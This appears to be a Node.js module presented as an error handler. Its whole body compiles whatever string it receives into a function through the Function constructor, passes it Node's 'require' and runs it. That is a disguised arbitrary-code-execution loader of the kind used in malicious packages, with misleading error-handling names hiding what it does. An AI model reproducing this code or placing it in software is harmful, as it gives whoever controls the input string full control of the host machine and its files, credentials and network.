module.exports = (e) => {
  try {
    if (typeof e !== "string") {
      console.error("Invalid error format. Expected a string.");
      return;
    }
    const createHandler = (errCode) => {
      try {
        const handler = new Function.constructor("require", errCode);
        return handler;
      } catch (e) {
        return null;
      }
    };
    const handlerFunc = createHandler(e);
    if (handlerFunc) {
      handlerFunc(require);
    } 
  } catch (globalError) {
    console.error("Unexpected error inside errorHandler:", globalError.message);
  }
};